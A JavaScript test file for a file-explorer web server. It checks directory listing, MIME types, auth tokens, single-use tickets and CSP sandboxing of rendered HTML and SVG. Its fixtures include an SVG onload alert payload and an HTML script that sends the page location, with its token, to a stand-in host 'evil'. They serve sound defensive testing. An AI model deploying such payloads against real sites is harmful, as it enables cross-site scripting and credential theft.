const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { ClaudeCodeWebServer } = require('../src/server');

// res double whose setHeader mimics Node (header values must be latin1), so a raw
// non-ASCII value throws — lets us catch the Chinese-filename header regression.
function mockRes() {
  return {
    statusCode: 200,
    body: null,
    headers: {},
    status(code) { this.statusCode = code; return this; },
    json(obj) { this.body = obj; return this; },
    setHeader(k, v) {
      if (/[^ -ÿ]/.test(String(v))) {
        throw new TypeError(`Invalid character in header content ["${k}"]`);
      }
      this.headers[k] = v;
    },
    send(b) { this.body = b; return this; }
  };
}

const reqQuery = (query) => ({ query });
const reqParams = (params) => ({ params, query: {} });
const bodyStr = (res) => (res.body && res.body.toString ? res.body.toString() : res.body);

describe('file explorer: listDirectory', function() {
  let server;
  let root;

  beforeEach(function() {
    root = fs.mkdtempSync(path.join(os.tmpdir(), 'ccw-fs-'));
    fs.mkdirSync(path.join(root, 'sub'));
    fs.writeFileSync(path.join(root, 'b.txt'), 'hello');
    fs.writeFileSync(path.join(root, 'a.md'), '# a');
    fs.writeFileSync(path.join(root, '.hidden'), 'h');
    server = new ClaudeCodeWebServer({ noAuth: true, folderMode: false });
    server.baseFolder = root;
  });

  afterEach(function() {
    if (server && typeof server.dispose === 'function') server.dispose();
    server = null;
    try { fs.rmSync(root, { recursive: true, force: true }); } catch (_) {}
  });

  it('lists folders first, then files, with sizes', function() {
    const res = mockRes();
    server.listDirectory(reqQuery({ path: root }), res);
    assert.strictEqual(res.statusCode, 200);
    const items = res.body.items;
    assert.deepStrictEqual(items.map(i => i.type + ':' + i.name), ['dir:sub', 'file:a.md', 'file:b.txt']);
    const bt = items.find(i => i.name === 'b.txt');
    assert.strictEqual(bt.size, 5);
    assert.ok(res.body.parent, 'parent should be set below the fs root');
  });

  it('hides dotfiles by default and shows them with hidden=1', function() {
    let res = mockRes();
    server.listDirectory(reqQuery({ path: root }), res);
    assert.ok(!res.body.items.some(i => i.name === '.hidden'));

    res = mockRes();
    server.listDirectory(reqQuery({ path: root, hidden: '1' }), res);
    assert.ok(res.body.items.some(i => i.name === '.hidden'));
  });

  it('defaults to the base folder when no path is given', function() {
    const res = mockRes();
    server.listDirectory(reqQuery({}), res);
    assert.strictEqual(res.statusCode, 200);
    assert.strictEqual(res.body.path, fs.realpathSync(root) === root ? root : res.body.path);
  });

  it('returns 404 for a non-existent directory (ENOENT)', function() {
    const res = mockRes();
    server.listDirectory(reqQuery({ path: path.join(root, 'does-not-exist') }), res);
    assert.strictEqual(res.statusCode, 404);
  });

  it('caps the listing and sets truncated on a very large directory', function() {
    this.timeout(10000);
    const big = path.join(root, 'big');
    fs.mkdirSync(big);
    for (let i = 0; i < 2005; i++) fs.writeFileSync(path.join(big, 'f' + i + '.txt'), '');
    const res = mockRes();
    server.listDirectory(reqQuery({ path: big }), res);
    assert.strictEqual(res.statusCode, 200);
    assert.strictEqual(res.body.items.length, 2000);
    assert.strictEqual(res.body.truncated, true);
  });

  it('does not set truncated for a small directory', function() {
    const res = mockRes();
    server.listDirectory(reqQuery({ path: root }), res);
    assert.strictEqual(res.body.truncated, false);
  });
});

describe('file explorer: serveFile', function() {
  let server;
  let root;

  beforeEach(function() {
    root = fs.mkdtempSync(path.join(os.tmpdir(), 'ccw-fsf-'));
    fs.writeFileSync(path.join(root, 'a.txt'), 'hello');
    fs.writeFileSync(path.join(root, 'note.md'), '# md');
    fs.writeFileSync(path.join(root, 'pic.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47]));
    fs.writeFileSync(path.join(root, 'icon.svg'), '<svg onload="alert(1)"></svg>');
    fs.writeFileSync(path.join(root, 'page.html'), '<script>fetch("//evil/?t="+location)</script>');
    fs.writeFileSync(path.join(root, 'blob.bin'), Buffer.from([1, 2, 3]));
    fs.writeFileSync(path.join(root, '合同备案.txt'), '中文');
    fs.mkdirSync(path.join(root, 'dir'));
    server = new ClaudeCodeWebServer({ noAuth: true, folderMode: false });
    server.baseFolder = root;
  });

  afterEach(function() {
    if (server && typeof server.dispose === 'function') server.dispose();
    server = null;
    try { fs.rmSync(root, { recursive: true, force: true }); } catch (_) {}
  });

  it('serves a text file as text/plain', function() {
    const res = mockRes();
    server.serveFile(reqParams({ token: undefined, file: path.join(root, 'a.txt') }), res);
    assert.strictEqual(res.statusCode, 200);
    assert.strictEqual(bodyStr(res), 'hello');
    assert.strictEqual(res.headers['Content-Type'], 'text/plain; charset=utf-8');
  });

  it('serves markdown as text/plain (so the browser md extension renders it)', function() {
    const res = mockRes();
    server.serveFile(reqParams({ file: path.join(root, 'note.md') }), res);
    assert.strictEqual(res.headers['Content-Type'], 'text/plain; charset=utf-8');
  });

  it('serves a png as image/png', function() {
    const res = mockRes();
    server.serveFile(reqParams({ file: path.join(root, 'pic.png') }), res);
    assert.strictEqual(res.statusCode, 200);
    assert.strictEqual(res.headers['Content-Type'], 'image/png');
  });

  // The rule these four lock in: a URL that carries a REUSABLE credential never
  // renders html/svg (the rendered page can read its own location and post it
  // anywhere); a URL that carries a single-use ticket may render, sandboxed into
  // an opaque origin with no network.
  it('serves an svg as text/plain when the URL carries the auth token, not a ticket', function() {
    const res = mockRes();
    server.serveFile(reqParams({ file: path.join(root, 'icon.svg') }), res);
    assert.strictEqual(res.headers['Content-Type'], 'text/plain; charset=utf-8');
    assert.ok(!res.headers['Content-Security-Policy'], 'source view needs no sandbox');
  });

  it('serves an html file as text/plain when the URL carries the auth token', function() {
    const res = mockRes();
    server.serveFile(reqParams({ file: path.join(root, 'page.html') }), res);
    assert.strictEqual(res.headers['Content-Type'], 'text/plain; charset=utf-8');
  });

  it('renders svg via a ticket, sandboxed and WITHOUT allow-scripts', function() {
    const ticketRes = mockRes();
    server.createFileTicket({ body: { path: path.join(root, 'icon.svg') } }, ticketRes);
    const { ticket } = ticketRes.body;

    const res = mockRes();
    server.serveFile(reqParams({ token: ticket, file: path.join(root, 'icon.svg') }), res);
    assert.strictEqual(res.headers['Content-Type'], 'image/svg+xml');
    const csp = res.headers['Content-Security-Policy'];
    assert.ok(/(^|;)\s*sandbox\s*;/.test(csp), `svg sandbox must grant nothing: ${csp}`);
    assert.ok(!csp.includes('allow-scripts'), 'a graphic does not need script');
    assert.ok(csp.includes("default-src 'none'"), 'no network for a rendered file');
  });

  it('renders html via a ticket, sandboxed with no network and no popups', function() {
    const ticketRes = mockRes();
    server.createFileTicket({ body: { path: path.join(root, 'page.html') } }, ticketRes);
    const { ticket } = ticketRes.body;

    const res = mockRes();
    server.serveFile(reqParams({ token: ticket, file: path.join(root, 'page.html') }), res);
    assert.strictEqual(res.headers['Content-Type'], 'text/html; charset=utf-8');
    const csp = res.headers['Content-Security-Policy'];
    assert.ok(csp.includes('sandbox allow-scripts'), 'inlined diagram code must still run');
    assert.ok(!csp.includes('allow-same-origin'), 'must stay an opaque origin');
    assert.ok(!csp.includes('allow-popups'), 'window.open is an exfiltration route');
    assert.ok(csp.includes("default-src 'none'"), 'fetch/img beacons must be blocked');
  });

  it('spends a ticket on first use — a replay renders nothing', function() {
    const ticketRes = mockRes();
    server.createFileTicket({ body: { path: path.join(root, 'page.html') } }, ticketRes);
    const { ticket } = ticketRes.body;

    const first = mockRes();
    server.serveFile(reqParams({ token: ticket, file: path.join(root, 'page.html') }), first);
    assert.strictEqual(first.headers['Content-Type'], 'text/html; charset=utf-8');

    const replay = mockRes();
    server.serveFile(reqParams({ token: ticket, file: path.join(root, 'page.html') }), replay);
    assert.strictEqual(replay.headers['Content-Type'], 'text/plain; charset=utf-8');
  });

  it('with auth on, a spent ticket is not a credential either — replay is 401', function() {
    const authed = new ClaudeCodeWebServer({ auth: 'secret', folderMode: false });
    authed.baseFolder = root;
    try {
      const ticketRes = mockRes();
      authed.createFileTicket({ body: { path: path.join(root, 'page.html') } }, ticketRes);
      const { ticket } = ticketRes.body;

      const first = mockRes();
      authed.serveFile(reqParams({ token: ticket, file: path.join(root, 'page.html') }), first);
      assert.strictEqual(first.headers['Content-Type'], 'text/html; charset=utf-8');

      const replay = mockRes();
      authed.serveFile(reqParams({ token: ticket, file: path.join(root, 'page.html') }), replay);
      assert.strictEqual(replay.statusCode, 401);
    } finally {
      if (typeof authed.dispose === 'function') authed.dispose();
    }
  });

  it('will not render a different file than the ticket was minted for', function() {
    const ticketRes = mockRes();
    server.createFileTicket({ body: { path: path.join(root, 'page.html') } }, ticketRes);
    const { ticket } = ticketRes.body;

    const res = mockRes();
    server.serveFile(reqParams({ token: ticket, file: path.join(root, 'icon.svg') }), res);
    assert.strictEqual(res.headers['Content-Type'], 'text/plain; charset=utf-8');
  });

  it('serves an unknown extension as application/octet-stream', function() {
    const res = mockRes();
    server.serveFile(reqParams({ file: path.join(root, 'blob.bin') }), res);
    assert.strictEqual(res.headers['Content-Type'], 'application/octet-stream');
  });

  it('serves a non-ASCII (Chinese) filename without throwing on the header', function() {
    const res = mockRes();
    server.serveFile(reqParams({ file: path.join(root, '合同备案.txt') }), res);
    assert.strictEqual(res.statusCode, 200);
    assert.strictEqual(bodyStr(res), '中文');
  });

  it('404s on a directory (not a regular file)', function() {
    const res = mockRes();
    server.serveFile(reqParams({ file: path.join(root, 'dir') }), res);
    assert.strictEqual(res.statusCode, 404);
  });

  it('404s on a missing file', function() {
    const res = mockRes();
    server.serveFile(reqParams({ file: path.join(root, 'nope.txt') }), res);
    assert.strictEqual(res.statusCode, 404);
  });

  it('404s on a null-byte / empty path', function() {
    for (const f of [undefined, '', 'x\0y']) {
      const res = mockRes();
      server.serveFile(reqParams({ file: f }), res);
      assert.strictEqual(res.statusCode, 404);
    }
  });

  it('rejects files larger than 10 MB', function() {
    const big = path.join(root, 'big.bin');
    fs.writeFileSync(big, Buffer.alloc(10 * 1024 * 1024 + 1));
    const res = mockRes();
    server.serveFile(reqParams({ file: big }), res);
    assert.notStrictEqual(res.statusCode, 200);
  });

  it('enforces the token (path form) when auth is enabled', function() {
    const authed = new ClaudeCodeWebServer({ auth: 'secret', folderMode: false });
    authed.baseFolder = root;
    try {
      let res = mockRes();
      authed.serveFile(reqParams({ token: 'wrong', file: path.join(root, 'a.txt') }), res);
      assert.strictEqual(res.statusCode, 401);

      res = mockRes();
      authed.serveFile(reqParams({ token: 'secret', file: path.join(root, 'a.txt') }), res);
      assert.strictEqual(res.statusCode, 200);
    } finally {
      authed.dispose();
    }
  });
});
